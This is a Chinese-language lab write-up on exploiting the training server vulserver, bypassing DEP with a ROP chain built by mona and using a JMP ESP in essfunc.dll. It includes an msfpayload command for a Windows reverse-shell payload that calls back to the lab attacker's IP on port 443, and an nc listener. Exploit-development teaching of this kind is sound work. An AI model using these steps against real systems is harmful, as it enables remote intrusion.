# 利用ROP绕过DEP（Defeating DEP with ROP）调试笔记

0x00 背景
-------

* * *

本文根据参考文献《Defeating DEP with ROP》，调试vulserver，研究ROP (Return Oriented Programming)基本利用过程，并利用ROP绕过DEP (Data Execution Prevention)，执行代码。 0x00 ROP概述 缓冲区溢出的目的是为了控制EIP，从而执行攻击者构造的代码流程。

防御缓冲区溢出攻击的一种措施是，选择将数据内存段标记为不可执行，

![enter image description here](http://drops.javaweb.org/uploads/images/55e8cbdf368f7fb38b3719a7d23bca7872d54c81.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/007352edc5de2be102a884dad8d3c2afb75eb1cc.jpg)

随着攻击技术的演进，产生了ROP (Return-Oriented Programming)，Wiki上中文翻译为“返回导向编程”。下面的结构图回顾了Buffer overflow的发展历史和ROP的演进历史，不同的颜色表示了不同的研究内容，分为表示时间杂项标记、社区研究工作、学术研究工作，相关信息大家可以在网上查找。

![enter image description here](http://drops.javaweb.org/uploads/images/345790389876b0205ace014384f9b6dc817cd609.jpg)

由于DEP的存在，为了执行代码重用攻击，攻击者构造ROP Chain，通过寻找小部件（Gadget），将复杂操作转化为小操作，然后执行有用操作的短指令序列。例如，一个Gadget可能是让两个寄存器相加，或者从内存向寄存器传递字节。攻击者可以将这些Gadget链接起来从而执行任意功能。

链接Gadget的一种方式是寻找以RET结尾的指令序列。RET指令等效于POP+JUMP，它将当前栈顶指针ESP指向的值弹出，然后跳转到那个值所代表的地址，继续执行指令，攻击者通过控制ESP指向的值和跳转，达到间接控制EIP的目的，在ROP利用方法下ESP相当于EIP。如果攻击者可以控制栈空间布局，那么他就可以用RET控制跳转，从而达到间接控制EIP的目的。

下面举一个简单例子，说明ROP构造Gadget过程，栈空间形式化表示如下：

![enter image description here](http://drops.javaweb.org/uploads/images/03f7698937f4ec3b372287aeb35ce4494ccf9bac.jpg)

Gadget构造过程描述：

*   假设攻击者打算将V1值写入V2所指向的内存空间，即Memory[V2] = V1；
    
*   攻击者控制了栈空间，能够构造栈空间布局；
    
*   **攻击者采用间接方式，寻找等效指令实现**，通过寻找Gadget指令实现；
    
*   攻击者找到Gadget，pop eax; ret。pop eax会将当前栈顶指针ESP所指向的内容V1存入寄存器EAX中。ESP值加4，指向新地址ESP=[ESP+4]。RET指令会将ESP新指向的内容a3存入寄存器EIP中，然后CPU会跳转到值a3所指向的地址执行。因此**RET指令能够根据栈空间上的值，控制程序的跳转地址**；
    
*   类似的pop ebp; ret 能够为ebp赋值，并让程序跳转到所指向的地址；
    
*   攻击者如果继续使用gadget，mov ebp,eax; ret，这将eax中的值移动到ebp所指向的地址中；
    
*   通过构造栈空间内容，让CPU按顺序执行上述Gadget，攻击者能够控制eax和ebp的值，并让eax的值写入地址ebp中。
    
*   借助Gadget，通过等效变换，攻击者可以向任意内存写入。
    

Gadget执行过程描述：

1） 初始时，栈顶指针为ESP，所指向内容为V1，EIP=a1。

2） POP操作，ESP值加4，POP相当于内存传送指令。

3） POP和MOV指令执行完，CPU会继续向下顺序执行。

4） RET相当于POP+JMP，所以RET操作，ESP值也会加4。

![enter image description here](http://drops.javaweb.org/uploads/images/783d7836b714b30106f10026a2a7265e46c607bc.jpg)

ROP利用Gadget图形示意：

![enter image description here](http://drops.javaweb.org/uploads/images/8f62fb56f396b1706a37ef50f55c7f08ddafec30.jpg)

0x01 调试环境和工具
------------

* * *

![enter image description here](http://drops.javaweb.org/uploads/images/05b3d1602c2ec125c812135a9b1fb6322a8d227b.jpg)

0x02 DEP默认设置，测试反弹shell
----------------------

* * *

**查询DEP的状态**

根据微软官方说明：http://support.microsoft.com/kb/912923/zh-cn

![enter image description here](http://drops.javaweb.org/uploads/images/d431576caeaab0993495dd8e3542f572841de6b0.jpg)

运行命令：

```
wmic OS Get DataExecutionPrevention_SupportPolicy

```

![enter image description here](http://drops.javaweb.org/uploads/images/4039d2540c92080b0d4a9f8752885d7027a9567f.jpg)

状态码为2，说明是默认配置。

另外，实验中，需要关闭Window 7防火墙。

![enter image description here](http://drops.javaweb.org/uploads/images/c871c1f1dfbddef0fbe1bbc0bf1d06773210d97a.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/77afedd47907b3c99a0e359961610a66643f1004.jpg)

查询运行vulserver的Windows 7系统IP地址：192.168.175.130。

![enter image description here](http://%21[enter%20image%20description%20here][12]/)

**启动存在漏洞的服务器。**

![enter image description here](http://drops.javaweb.org/uploads/images/c172fec84eef7396c23350f58ccc1459272d44cc.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/eae5da69985fd657b43b9ed08256dc9c9faa6e2e.jpg)

**服务器连接测试**

攻击端远程连接`nc 192.168.175.130:9999`，测试服务器连接状态。

![enter image description here](http://drops.javaweb.org/uploads/images/812ffa6bce9646f9a9502f8abfec172b730587eb.jpg)

**查看服务器端网络状态**

![enter image description here](http://drops.javaweb.org/uploads/images/22dd1c3c0d155a902f45e3a03f38fadad4c20e0d.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/802a21751a2109ab6d930e2b797fee8dd26a03f1.jpg)

**生成测试脚本**

![enter image description here](http://drops.javaweb.org/uploads/images/4b8d07c6f0cf620cfeab5b9967bd58361e4536dd.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/0d0d6d5f2215fe0dfce870e976b619cd6e9f369e.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/8d54988eb398984fee28cf1cbb645863a7472395.jpg)

在 Kali Linux上生成测试脚本，文本编辑`nano vs-fuzz1`，权限修改`chmod a+x vs-fuzz1`， 执行脚本`./vs-fuzz1`。

**测试vulserver缓冲区大小**

测试TRUN命令，测试接受字符大小，查看vulserver服务器崩溃情况。

![enter image description here](http://drops.javaweb.org/uploads/images/04e7958cb23a885ee331297ffbe16b6e9650da9a.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/bc2b5b310396103fd48acee0dbac2f1412480389.jpg)

不断调整字符长度，从100到2000，大小为2000时程序崩溃。

![enter image description here](http://drops.javaweb.org/uploads/images/4c5444f16fbcd72405484f2e377a2b507e6f580f.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/48f456572bba85a796c2c3cda31b70a09bde3a9c.jpg)

备注：由于实验环境在其他测试中，设置了默认调试器，当vulserver服务崩溃后，Windbg直接跳出，捕获异常。

![enter image description here](http://drops.javaweb.org/uploads/images/c536b37a543951f4e9028c53c7035459f2a3cdfe.jpg)

修改默认调试器设置注册表，`If Auto is set to 0, a message box is displayed prior to postmortem debugging`。

在32位Windows 7系统下，注册表在`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\AeDebug`。 键值Debugger为windbg。

![enter image description here](http://drops.javaweb.org/uploads/images/68c8ce65e24f8caf128f82f636565f13cefe1e99.jpg)

在64位Windows Server2008系统下，注册表`HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug`。

![enter image description here](http://drops.javaweb.org/uploads/images/cac4ed87ae2ce2019efcec38befce5344e6095ad.jpg)

将Auto值设置为0后，重新打开vulserver.exe，Kali端重新发送数据，可以看到系统弹出了崩溃对话框。

![enter image description here](http://drops.javaweb.org/uploads/images/70d5394251470470892c789f87295c0fa970e449.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/a7a0cd5df9e843dbfb26adfa600fd380fe899ca5.jpg)

**打开调试器，附加进程**

为了进一步测试，程序崩溃情况，打开Immunity Debugger调试器，附加进程。

![enter image description here](http://drops.javaweb.org/uploads/images/4a89bb434d3dcf396da8220500e9e956609741a7.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/ba306b6de751000660ecf664fde6dc19e34166e6.jpg)

附加调试器后，重新发送数据包，选择发送字符长度3000，在调试器左边窗口的下部，可以看到 "Access violation when writing to [41414141] "。

![enter image description here](http://drops.javaweb.org/uploads/images/bb1905ac6b3be5c5ce8c253771d9b28af5ff60cc.jpg)

"41" 是字符A的十六进制表现，具体对应表如下图。

![enter image description here](http://drops.javaweb.org/uploads/images/a147836ad7fd62c661e3b0b474a721e463af7e5c.jpg)

这说明发送的“A”字符以某种方式由服务器程序错误地作为地址写入。由于地址是32位，也就是4个字节，而“A”的十六进制表示为41，所以地址变成了`41414141`。

这是一个典型的缓冲区溢出攻击，当一个子例程返回时，注入的字符`41414141`被放入EIP中，所以它成为下一条将要执行的指令地址。 但`41414141`是不是一个有效的地址，无法继续执行，所以调试器检测到程序崩溃并暂停，所以显示了Access violation。

从调试结果而言，程序存在溢出，存在可以被利用的漏洞。

开发漏洞利用程序的一种通常方式是，攻击字符长度固定，从而产生不同结果。本实验后续都使用字符长度3000来进行调试。

![enter image description here](http://drops.javaweb.org/uploads/images/8ed19f8bab8da68623341b0c19a0e1f299f395d4.jpg)

**生成非重复模式的字符**

为了精确表示哪些字符注入到EIP中，需要生成非重复的字符，具体代码如下。

![enter image description here](http://drops.javaweb.org/uploads/images/c8462d268f73d3d8b19342a53107541309fa1bba.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/6dd7f8189f445d270d6ac5a8ae15f9676a219fc1.jpg)

在Kali Terminal 中输入命令，`chmod a+x vs-eip0`，使程序可执行。

![enter image description here](http://drops.javaweb.org/uploads/images/b55433eca7ee72171f8855593f99973399de1073.jpg)

执行脚本`./vs-eip0`，可以看到生成的模式 (pattern)都是3个数字加一个A。

![enter image description here](http://drops.javaweb.org/uploads/images/191a1c9661cfac8112eb325410e375310525bc8b.jpg)

如果形象化展示，中间添加空格，该模式是这样的：

```
000A 001A 002A 003A 004A 
             ...
250A 251A 252A 253A 254A 
             ...
495A 496A 497A 498A 499A

```

我们得到500组，每组4个字符，从000A 到 499A,总共2000个字节。

添加生成的字符，重新生成具有区分度的测试脚本如下。

![enter image description here](http://drops.javaweb.org/uploads/images/6ac4d530132184e979472ca945e39aca10f46b98.jpg)

再次执行。

![enter image description here](http://drops.javaweb.org/uploads/images/e45a0cd557504f57436593a069da3295aa7ae54c.jpg)

通过调试器，可以发现"Access violation when executing [35324131]"。

![enter image description here](http://drops.javaweb.org/uploads/images/090a3b08f8709fce0d93967a43a125b2c8bb91d7.jpg)

下面将十六进制转为字符表示：

```
Hex  Character
---  ---------
 35      5
 32      2
 41      A
 31      1

```

因此，字符是“52A1”。然而，由于英特尔处理器是“小端字节序”，所以地址被反序输入，所以输入到EIP中的实际字符是“1A25”。

我们输入的字符串在内存中的表示如下所示：

![enter image description here](http://drops.javaweb.org/uploads/images/d68bf65e615e848d544d42b5de440775b84d2918.jpg)

则不用借助于类似pattern_offset.rb之类的ruby脚本，可以从图形上快速计算出偏移值，251个四字节+2个字节。

模式'1A25'出现在251×4+2=1004+2=1006个字节之后

由于程序是在接收了2000字符之后崩溃，所以测试脚本在非重复模式之前添加了1000个A字符，则EIP包含4个字节是在2006字节之后。

**控制EIP指向地址**

在2006字节之后添加BCDE，使程序溢出后，EIP被覆盖为BCDE，后面继续填充许多F，以管理员模式运行Immunity Debugger和测试脚本。

![enter image description here](http://drops.javaweb.org/uploads/images/bc5fba4bb639398dc63b9557753211beaa6c3705.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/123f6622295116cd34e5fb404fefb7bed107e1f2.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/f66b87171a650350a6afe34fa19fa03844015a2f.jpg)

调试器捕获异常，"Access violation when executing [45444342]"，说明成功了，因为十六进制值是反序显示“BCDE”。

![enter image description here](http://drops.javaweb.org/uploads/images/92d85adce41218d42b1d851b1f5c944c1a2034e6.jpg)

**查看内存中ESP的值**

当子例程返回后，我们来看一下ESP所指向的值。溢出之后，在ESP所指向的空间(01C1F9E0)写入了许多FFFF。

![enter image description here](http://drops.javaweb.org/uploads/images/26b9b568671110a886f85ff673b8e9d5b3d60c1b.jpg)

**测试坏字符**

漏洞利用程序通过欺骗程序，插入代码到数据结构。

通常而言，以下这些字符会带来麻烦:

![enter image description here](http://drops.javaweb.org/uploads/images/f7d35fa6067e74f542c9a5f6462a350bbc3c49ba.jpg)

并不是上述所有字符会带来麻烦，也有可能存在其他坏字符。所以，接下来的任务是设法注入它们，看看会发生什么。

为了进一步测试坏字符，程序会向服务器发送一个3000字节，其中包括2006个“A”字符，随后是“BCDE”，程序返回结束后，它应该在EIP中，然后是所有256个可能的字符，最后是足够的“'F”字符，使得总长度为3000个字节。执行过程如下所示。

![enter image description here](http://drops.javaweb.org/uploads/images/f7318dfa0b87a563794dc4cce253f2fc0787ac24.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/1e5fc62bd55ea37b6872c102c7fd47f5c7834a21.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/94155ec70b4d82ea94f40d9e62b366c5b5b42ecb.jpg)

查看调试器左下侧窗口。第一个字节是00，但其它字符没有注入到内存中，既不是其他255个字节，也不是“F”字符。说明发生了00字节结束的字符串。 只有'\ X00'是坏字符。

![enter image description here](http://drops.javaweb.org/uploads/images/6b80cc4c86b043cf978dc1784acc7a9bbc5cd3c6.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/447696afc6af1fb942fa66bd8c5ff3696f14af62.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/ec80ef6a8898b2e568a7a14545d26126bc559e7f.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/b43afe06e82860a60c6127cc43550845fda58e24.jpg)

**查找合适的模块**

已经控制了EIP，现在需要让它指向我们希望的地址，我们需要在ESP所执行的位置执行代码。

能起作用的两个最简单指令是“JMP ESP”和两个指令序列“PUSH ESP; RET”。

为了找到这些指令，我们需要检查Vulnerable Server运行时载入的模块。

下面利用Immunity Debugger插件 mona.py，下载后将mona.py放置在程序安装目录`C: \Immunity Inc\Immunity Debugger\PyCommands`中。

![enter image description here](http://drops.javaweb.org/uploads/images/c51ecfda2bc6fbd1289acf4471281b2892dc0724.jpg)

运行服务器程序，在调试器命令输入窗口中运行

```
!mona modules

```

![enter image description here](http://drops.javaweb.org/uploads/images/07fbcd3cb4cb9066fa4e5a459ffbace017c409c1.jpg)

由于Windows 7引入了ASLR，它导致**模块的地址在每次启动之后都会发生变化**。改变它每次重新启动时模块的地址。

为了得到可靠的漏洞利用程序，我们需要一个模块不带有ASLR和Rebase。

从下图中可以发现，有两个模块Rebase 和 ASLR 列都显示为"False"，它们是essfunc.dll和vulnserver.exe。

![enter image description here](http://drops.javaweb.org/uploads/images/bf7ce7d2d4a7867c06f23f4dd601182f0c0b4994.jpg)

然而，由于 vulnserver.exe加载在非常低的地址值，开始于0x00，因此，任何引用该地址的vulnserver.exe将会获得一个空字节，而由于'\X00'是坏字符，所以它将不起作用而不能使用，因此，唯一可用的模块是essfunc.dll。 12 测试跳转指令 利用metasploit中的nasm_shell，可以显示"JMP ESP"和"POP ESP; RET"指令的汇编表示，分别是FFE4和5CC3。

如果我们能在essfunc.dll中找到这些字符序列，那么我们就能用它们开发漏洞利用程序。

![enter image description here](http://drops.javaweb.org/uploads/images/67187366254769adf14712f714e75899c8401e65.jpg)

在调试器中使用如下命令：

```
!mona find -s "\xff\xe4" -m essfunc.dll

```

共发现9个，我们使用第一个地址`625011af`。

![enter image description here](http://drops.javaweb.org/uploads/images/fa168ca6eb074ed2b74fcfe7bdfaeda1f567b809.jpg)

**生成反弹shell代码**

查询攻击端IP地址，作为受害端反向连接的IP。

![enter image description here](http://drops.javaweb.org/uploads/images/84ad8ad18867012aa5818561fe4c7c4e9184301c.jpg)

指定IP、端口、编码器x86/shikata_ga_nai生成shellcode。

```
msfpayload windows/shell_reverse_tcp LHOST="192.168.175.142" LPORT=443 EXITFUNC=thread R | msfencode -e x86/shikata_ga_nai -b '\x00'

```

![enter image description here](http://drops.javaweb.org/uploads/images/e52f9f3a4e2e856edb483a70fe312b444f286ef3.jpg)

生成完整测试代码。

![enter image description here](http://drops.javaweb.org/uploads/images/3b1d0edf223b276f276b0f55fd36523645b6580b.jpg)

运行`nc -nlvp 443`，监听443端口。

![enter image description here](http://drops.javaweb.org/uploads/images/df01adf672055b44ca60413ee963c6b6ebcd56fa.jpg)

运行vulserver，攻击端执行测试脚本 ./vs-shell，发送数据。

![enter image description here](http://drops.javaweb.org/uploads/images/46cb8eb8182e1c4e3c5cf3bf96141b7b8558a0b1.jpg)

攻击端获得反弹shell，可以查询信息。

![enter image description here](http://drops.javaweb.org/uploads/images/99be1a1341fe0be428312caf44a15e64b966c57d.jpg)

**测试栈空间代码执行情况**

在基本DEP开启条件下，测试漏洞代码在内存空间上的可执行情况。

![enter image description here](http://drops.javaweb.org/uploads/images/7d45ae066871f1d3df06ca9f778a50abd220e08d.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/9d51bab7942e1c784faf9e0b0b77c0ea4cf0cd8b.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/f62cf47031bd88cc03223a7c3fa7a0b190f06c2f.jpg)

NOP滑行区有许多“90”，最后跟着的是“CC”，说明可以向内存中注入并执行代码，代码为可执行状态。

![enter image description here](http://drops.javaweb.org/uploads/images/3637ec08e5e535727d71b22089d57d8f3ab06651.jpg)

0x03 DEP全部开启，测试反弹shell
----------------------

* * *

**DEP全部开启**

![enter image description here](http://drops.javaweb.org/uploads/images/1a8be515fcbb44c216a21dd9e94e72a58a3ddb3f.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/461affdea99e6d47be462b7d3b06b72fcbd1ec98.jpg)

**再次运行JMP ESP**

在DEP全部开启的状态下，再次运行./vs-rop1，调试器显示"Access violation"。

![enter image description here](http://drops.javaweb.org/uploads/images/1da03cab46df60b469e9fb1ea3d8af54ce090c91.jpg)

我们不能在栈空间上执行任何代码，甚至NOP也不行，无法单步执行。DEP是一个强大的安全功能，阻挡了许多攻击。下面通过ROP来绕过DEP。

理论上来说，我们可以用ROP构造出整个Metasploit载荷，例如，反向连接（reverse shell），但那需要花费大量的时间。在实际应用中，我们只需要用ROP关闭DEP即可，这是一个简单而优雅的解决方案。

为了关闭DEP，或在DEP关闭后分配内存空间，可以使用的函数有：VirtuAlloc(), HeapCreate(), SetProcessDEPPolicy(), NtSetInformationProcess(), VirtualProtect(), or WriteProtectMemory()。

拼凑“Gadgets”（机器语言代码块）是一个相当复杂的过程，但是， MONA的作者已经为我们完成了这项艰难的工作。

```
!mona rop -m *.dll -cp nonull

```

MONA会搜寻所有的DLL，用于构造有用的Gadgets链，可以想象，这是一个花费时间的工作。

**生成ROP Chain**

使用mona，我在开了2G内存的虚拟机中，运行消耗了 0:08:39。

![enter image description here](http://drops.javaweb.org/uploads/images/ad80b83020dcc43ef72f929fe0e12347480e495b.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/9f72467b30d63c74f3fdb380eaeee19c0a5ada24.jpg)

mona生成的rop_chains.txt，Python代码部分。

![enter image description here](http://drops.javaweb.org/uploads/images/f378c496e567d14fb06592bc131ff4bebd02ec95.jpg)

**测试ROP Chain**

通过ROP构造测试代码，再次运行，NOP滑行区有许多“90”，最后跟着的是“CC”，说明ROP链关闭了DEP，向栈上注入的代码可以被执行了，注入的代码是16个NOP和一个中断指令INT 3。

![enter image description here](http://drops.javaweb.org/uploads/images/3b1c8ab75ee38bf9cc3cc344c931e2744380c19c.jpg)

如果我们单步执行，EIP能够继续往下执行，而不会产生访问违例（Access violation）。

![enter image description here](http://drops.javaweb.org/uploads/images/0d60ea50012e87fdef14ddb61de311cb4bb4f5f7.jpg)

**利用ROP反弹shell**

将ROP代码加入，添加反弹shell的代码，修改生成测试脚本，开启nc -nlvp 443，启动服务端程序，执行程序vs-rop3。

![enter image description here](http://drops.javaweb.org/uploads/images/1942bf20c5f43fabe01bd514c834aff24341e919.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/e594d72c1571b2389064b42b6d6bb39ba0121606.jpg)

开启nc监听端口443，获得反弹shell，在攻击端查看Window 7系统上DEP状态，DataExecutionPrevention_SupportPolicy状态码为3，即所有进程都开启DEP情况下，利用ROP溢出成功。

![enter image description here](http://drops.javaweb.org/uploads/images/e2220fdacb73198f9ec57aa3181994aa02385646.jpg)

反弹连接成功后，在服务端，查看连接状态信息。

![enter image description here](http://drops.javaweb.org/uploads/images/301fcca582be2203cb4569e6bbdee29a80030e4a.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/c9911931a471c1b981aeda827d4e20db7d0e7b44.jpg)

使用TCPView查看，443端口是https连接。

![enter image description here](http://drops.javaweb.org/uploads/images/e4b7beb96b65bb60bc8f3dcc19fb5e87528771eb.jpg)

0x04 参考文献
---------

* * *

1) https://samsclass.info/127/proj/vuln-server.htm

2) https://samsclass.info/127/proj/rop.htm

3) http://www.thegreycorner.com/2010/12/introducing-vulnserver.html

4) http://resources.infosecinstitute.com/stack-based-buffer-overflow-tutorial-part-1-%E2%80%94-introduction/

5) http://en.wikipedia.org/wiki/Return-oriented_programming

6) http://blog.zynamics.com/2010/03/12/a-gentle-introduction-to-return-oriented-programming/

7) https://users.ece.cmu.edu/~dbrumley/courses/18487-f13/powerpoint/06-ROP.pptx

8) http://www.slideshare.net/saumilshah/dive-into-rop-a-quick-introduction-to-return-oriented-programming

9) http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html

10) http://blog.harmonysecurity.com/2010/04/little-return-oriented-exploitation-on.html

11) http://jbremer.org/mona-101-a-global-samsung-dll/

12) https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/

13) http://www.fuzzysecurity.com/tutorials/expDev/7.html

14) http://hardsec.net/dep-bypass-mini-httpd-server-1-2/?lang=en